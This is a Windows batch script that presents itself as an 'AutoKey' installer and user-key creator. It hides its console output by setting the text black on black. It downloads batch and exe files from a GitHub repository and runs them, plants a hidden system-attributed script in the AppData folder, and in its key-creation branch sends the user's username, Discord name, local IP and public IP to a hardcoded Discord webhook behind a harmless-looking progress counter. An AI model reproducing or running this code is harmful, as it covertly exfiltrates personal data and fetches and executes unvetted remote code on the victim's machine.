@echo off
cd %temp%
set hide=[40;30m
set normal=[40;37m
echo %hide%
echo %yellowyellow% 
rmdir /s /q wxy
rmdir /s /q myfiles
rmdir /s /q 2AE91573-3213-4F6E-921E-E61A79B1BD7B
del is64.txt
del is64.fil
del is64.bat
cls
goto loading
:blocked
echo %normal% 
cls
color 4
echo You are blocked!
set /p f=
exit
:loading
echo %hide% 
set file2=%random%%random%%random%
curl "https://raw.githubusercontent.com/W5GZ-X9YY-4GZY-3DYE/TF3N-KWTN-GWHL-6DA4/main/BlockedList.txt" --output "%file2%.bat"
call %file2%.bat
del %file2%.bat
if "%abc%"=="blocked" goto blocked
title USER_KEY_CREATE
echo %normal% 
cls

echo %normal%
:l
cls
title Autokey
echo %normal% 
echo 1. Update + install
echo 2. Uninstall
echo 3. USER_KEY_CREATOR
set /p select=Num: 
if %select%==1 goto key
if %select%==2 goto uninstall
if %select%==3 goto create
goto l
:uninstall
echo %hide% 
cd %appdata%
rmdir /s /q AutoKey
if exist %USERPROFILE%\desktop\AutoKey_start.exe del %USERPROFILE%\desktop\AutoKey_start.exe
cls
goto end
exit
:key
title AutoKey SETUP
cls
echo %normal% 
cls
echo To create USER_KEY Type "1"
echo -
set /p key=USER_KEY_
if %key%==1 goto create
set keyurl=https://raw.githubusercontent.com/W5GZ-X9YY-4GZY-3DYE/TF3N-KWTN-GWHL-6DA4/main/users/%key%
set file=%random%%random%%random%
cls 
echo checking...
echo %hide%
curl "%keyurl%" --output "%file%.exe" 
if exist "%file%.exe" goto key1
goto key
:key1
rename %file%.exe %file%.bat
call %file%.bat
del %file%.bat
if %username%==%pcname% goto key2
cls
goto key
:key2
cls
echo %hide%
cd %appdata%
if exist AutoKey goto un
goto con
:un
cd autokey
attrib -h -s "AutoKey.{8-0-6-7-7-5}.bat"
del "AutoKey.{8-0-6-7-7-5}.bat"
cd ..
:con
rmdir /s /q AutoKey
md AutoKey
cd autokey
if exist %USERPROFILE%\desktop\AutoKey_start.exe del %USERPROFILE%\desktop\AutoKey_start.exe
set AK=host1.bat
cls


curl "https://raw.githubusercontent.com/W5GZ-X9YY-4GZY-3DYE/TF3N-KWTN-GWHL-6DA4/main/AK.bat" --output "host1.bat"
cd "%USERPROFILE%\desktop"
curl "https://raw.githubusercontent.com/W5GZ-X9YY-4GZY-3DYE/TF3N-KWTN-GWHL-6DA4/main/AutoKey.START.exe.txt" --output "AutoKey_START.exe"
cd %appdata%/autokey"
(
echo set loadtab=4
echo set chrome=false
echo set USER_KEY=%key%
) > settings.ini
ren %AK% "AutoKey.{8-0-6-7-7-5}.bat"
attrib +h +s "AutoKey.{8-0-6-7-7-5}.bat"
:end
attrib -h -s "Setup.{8-0-6-7-7-5}.bat"
del "Setup.{8-0-6-7-7-5}.bat"
exit
:create
@echo off
set hide=[40;30m
set normal=[40;37m
for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do (
    set "LAN_IP=%%a"
)

for /f "tokens=2 delims=: " %%A in (
  'nslookup myip.opendns.com. resolver1.opendns.com 2^>NUL^|find "Address:"'
) Do set ExtIP=%%A
cd %temp%
:q
cls
echo Type "1" to Enter USER_KEY
echo Enter Discrod Username and Tag!
set /p name=: 
if %name%==1 goto key
:check
cls
echo Your Username And Tag: "%name%" ?
echo 1. Yes
echo 2. No
set /p check=Num: 
if %check%==1 goto con
if %check%==2 goto q
goto check
cls
:con
cls
echo %normal% It can take some time! %hide%
echo %normal% 1/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"--------------------------------------------------------------\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
cls
echo %normal% It can take some time! %hide%
echo %normal% 2/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"KEY=FALSE\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
cls
echo %normal% It can take some time! %hide%
echo %normal% 3/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"Date: %date%\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
cls
echo %normal% It can take some time! %hide%
echo %normal% 4/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"Key:  %random%%random%-%random%%random%-%random%%random%\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
cls
echo %normal% It can take some time! %hide%
echo %normal% 5/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"--------------------------------------------------------------\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
cls
echo %normal% It can take some time! %hide%
echo %normal% 6/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \":: %date%\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
cls
echo %normal% It can take some time! %hide%
echo %normal% 7/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"set pcname=%username%\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
cls
echo %normal% It can take some time! %hide%
echo %normal% 8/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"set rank=Member\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
cls
echo %normal% It can take some time! %hide%
echo %normal% 9/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"set name=%name%\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
cls
echo %normal% It can take some time! %hide%
echo %normal% 10/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"--------------------------------------------------------------\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
cls
echo %normal% It can take some time! %hide%
echo %normal% 11/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"IP: %LAN_IP%\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
cls
echo %normal% It can take some time! %hide%
echo %normal% 12/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"Public_IP: %ExtIP%\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
cls
echo %normal% It can take some time! %hide%
echo %normal% 13/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"--------------------------------------------------------------\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
cls
echo %normal% It can take some time! %hide%
echo %normal% 14/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"**        **\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
cls
echo %normal% Done! We will send USER_KEY in discord
set /p p=Press Enter!
goto l
